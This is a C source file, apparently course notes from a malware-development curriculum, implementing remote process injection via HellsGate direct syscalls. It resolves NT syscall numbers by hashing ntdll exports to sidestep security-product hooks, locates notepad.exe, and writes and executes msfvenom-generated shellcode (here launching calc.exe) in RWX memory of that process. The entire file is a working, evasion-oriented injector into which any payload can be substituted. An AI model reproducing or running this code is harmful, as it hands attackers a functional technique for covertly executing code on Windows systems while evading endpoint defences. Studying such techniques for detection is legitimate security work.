#pragma once
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include "structs.h"

/*
Maldev Academy Notes
Remote Process Injection via direct syscall using HellsGate
Reference - https://redops.at/en/blog/exploring-hells-gate
*/

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

//------------------------------------------------------------------------------------------------------------------------------------------------------------

// Payload - msfvenom -p windows/x64/exec CMD=calc.exe -f c 
unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
	0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7,
	0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52,
	0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
	0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49,
	0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34,
	0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
	0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1,
	0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
	0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41,
	0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
	0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF,
	0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0,
	0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80,
	0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C,
	0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
};

// Syscalls Hashes Values
/*
	printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
	printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", djb2("NtWriteVirtualMemory"));
	printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", djb2("NtProtectVirtualMemory"));
	printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
	printf("#define %s%s 0x%p \n", "NtWaitForSingleObject", "_djb2", djb2("NtWaitForSingleObject"));
*/
#define NtAllocateVirtualMemory_djb2 0xF5BD373480A6B89B;
#define NtWriteVirtualMemory_djb2 0x68A3C2BA486F0741;
#define NtProtectVirtualMemory_djb2 0x858BCB1046FB6A37;
#define NtCreateThreadEx_djb2 0x64DC7DB288C5015F;
#define NtWaitForSingleObject_djb2 0xC6A2FA174E551BCB;

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

// Hash function to create NTAPI hash values
DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

int main() {

	// Get TEB from current process
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();

	// Get PEB from TEB
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module. Second entry in the InMemoryOrderModuleList is usually ntdll.dll
	// Subtracting 0x10 gives us the start of the LDR_DATA_TABLE_ENTRY structure for ntdll.dll
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x1;
	
	//--------------------------------------------------------------------------
	// Initializing the 'Table' structure ...
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = NtWaitForSingleObject_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;
	
	//--------------------------------------------------------------------------
	// Enumerate processes

	HANDLE			hSnapShot = NULL;
	HANDLE			hProcess = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};
	LPWSTR	szProcessName = L"notepad.exe";

	// Create process snapshot
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	// Loop through each process in the snapshot
	Process32First(hSnapShot, &Proc);
	do {
		// Compare process with one provided in argument
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Get handle of matching process
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			printf("Found process\n");
			if (hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
			break;
		}
		// Next process if not matching
	} while (Process32Next(hSnapShot, &Proc));
	
	//--------------------------------------------------------------------------
	// Executing Payload
	NTSTATUS STATUS = 0x00;
	PVOID	pShellcodeAddress = NULL;
	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;
	HANDLE	hThread = NULL;

	// Allocate memory
	HellsGate(Table.NtAllocateVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &pShellcodeAddress, 0, &sSizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return 0x1;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pShellcodeAddress, sSizeOfShellcode);
	
	// Writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sSizeOfShellcode);
	HellsGate(Table.NtWriteVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, pShellcodeAddress, shellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sSizeOfShellcode);
		return 0x1;
	}

	// Changing the memory's permissions to RWX
	HellsGate(Table.NtProtectVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &pShellcodeAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return 0x1;
	}

	// executing the payload via thread 
	HellsGate(Table.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return 0x1;
	}

	// Wait for 1 seconds for the payload to run
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(Table.NtWaitForSingleObject.wSystemCall);
	STATUS = HellDescent(hThread, FALSE, &Timeout);
	
	return 0;
}